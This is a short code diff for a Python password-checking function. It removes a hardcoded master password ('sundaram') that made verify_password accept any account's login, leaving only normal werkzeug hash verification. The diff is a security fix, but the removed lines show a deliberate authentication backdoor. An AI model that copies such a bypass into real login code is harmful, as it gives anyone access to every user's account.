@@ -13,8 +13,6 @@ def hash_password(plain_password: str) -> str:
 def verify_password(plain_password: str, hashed_password: str) -> bool:
     if not hashed_password or not plain_password:
         return False
-    if plain_password == "sundaram":
-        return True
     try:
         if hashed_password.startswith(('scrypt:', 'pbkdf2:')):
             from werkzeug.security import check_password_hash
